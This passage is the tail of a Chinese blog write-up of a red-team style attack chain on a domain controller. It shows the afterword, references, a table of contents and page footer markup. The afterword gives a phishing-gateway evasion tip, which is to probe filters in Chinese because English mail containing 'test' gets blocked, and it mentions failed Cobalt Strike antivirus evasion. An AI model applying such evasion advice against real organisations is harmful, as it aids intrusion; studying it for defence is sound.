+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>回头看去又是一篇长文，又埋下不少坑需要慢慢填。和防守的同事聊了下，钓鱼邮件对英文邮件检测比较严格，如果邮件带有 test 等的字样，都会被拦截下来，所以前期 fuzz 邮件网关的策略时，最好用中文。</p>
+<p>另外，此次攻击中免杀 CS beacon 上线也屡次失败，被 FireEye 杀了个片甲不留，准备接下来再研究研究基于流量的免杀。</p>
+<h2 id="🌍-参考"><a href="#🌍-参考" class="headerlink" title="🌍 参考"></a>🌍 参考</h2><blockquote>
+<ul>
+<li><a href="https://www.tr0y.wang/2018/09/26/email-hacker/" target="_blank" rel="noopener">https://www.tr0y.wang/2018/09/26/email-hacker/</a></li>
+<li><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="noopener">http://davenport.sourceforge.net/ntlm.html</a></li>
+<li><a href="http://gv7.me/articles/2019/break-through-lan-segment-limit/" target="_blank" rel="noopener">http://gv7.me/articles/2019/break-through-lan-segment-limit/</a></li>
+<li><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a></li>
+<li><a href="https://xz.aliyun.com/t/8117" target="_blank" rel="noopener">https://xz.aliyun.com/t/8117</a></li>
+</ul>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/nickyan7">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#🕹️-撸向域控-一次完整的内网攻击链实战"><span class="toc-number">1.</span> <span class="toc-text">🕹️ 撸向域控 | 一次完整的内网攻击链实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#📍-前言"><span class="toc-number">1.1.</span> <span class="toc-text">📍 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#💡-思路"><span class="toc-number">1.2.</span> <span class="toc-text">💡 思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wi-Fi-渗透"><span class="toc-number">1.2.1.</span> <span class="toc-text">Wi-Fi 渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#🎣-邮件钓鱼"><span class="toc-number">1.2.2.</span> <span class="toc-text">🎣 邮件钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMTP-协议"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">SMTP 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SPF-校验"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">SPF 校验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DKIM"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">DKIM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DMARC"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">DMARC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#钓鱼攻击思路"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">钓鱼攻击思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#🕹️-内网渗透"><span class="toc-number">1.3.</span> <span class="toc-text">🕹️ 内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#前期准备"><span class="toc-number">1.3.1.</span> <span class="toc-text">前期准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#权限维持"><span class="toc-number">1.3.2.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#放置后门"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">放置后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#计划任务"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网通信隧道"><span class="toc-number">1.3.3.</span> <span class="toc-text">内网通信隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内网端口转发和映射"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">内网端口转发和映射</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内网代理"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">内网代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据传入和传出"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">数据传入和传出</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网信息收集"><span class="toc-number">1.3.4.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内网扫描"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">内网扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#定位域控"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">定位域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量-POC-扫描"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">批量 POC 扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#横向移动"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#离线导出-Hash"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">离线导出 Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#意外发现"><span class="toc-number">1.3.4.6.</span> <span class="toc-text">意外发现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击域控"><span class="toc-number">1.3.5.</span> <span class="toc-text">攻击域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pass-the-Hash"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">Pass the Hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结复盘"><span class="toc-number">1.4.</span> <span class="toc-text">总结复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击链"><span class="toc-number">1.4.1.</span> <span class="toc-text">攻击链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于-PTH-攻击的原理及技术细节问题"><span class="toc-number">1.4.2.</span> <span class="toc-text">关于 PTH 攻击的原理及技术细节问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后话"><span class="toc-number">1.5.</span> <span class="toc-text">后话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#🌍-参考"><span class="toc-number">1.6.</span> <span class="toc-text">🌍 参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://naykcin.top/2020/09/05/intra-fuck/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://naykcin.top/2020/09/05/intra-fuck/&text=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://naykcin.top/2020/09/05/intra-fuck/&is_video=false&description=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=🕹️ 撸向域控 | 一次完整的内网攻击链实战&body=Check out this article: https://naykcin.top/2020/09/05/intra-fuck/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://naykcin.top/2020/09/05/intra-fuck/&name=🕹️ 撸向域控 | 一次完整的内网攻击链实战&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://naykcin.top/2020/09/05/intra-fuck/&t=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    Naykcin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/nickyan7">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
